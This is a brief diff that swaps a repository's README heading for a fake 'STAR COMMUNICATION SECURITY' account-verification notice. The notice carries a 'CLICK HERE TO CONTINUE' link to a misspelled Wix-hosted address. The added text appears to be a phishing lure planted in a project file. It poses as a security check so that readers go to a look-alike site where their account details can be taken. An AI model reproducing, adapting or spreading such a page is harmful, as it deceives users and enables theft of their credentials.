@@ -1,1 +1,6 @@
-# README.md
+STAR COMMUNICATION SECURITY
+
+ACCOUNT VERIFICATION PAGE
+
+[CLICK HERE TO CONTINUE](https://mailintrstaraccoun.wixsite.com/intrstcom
+)
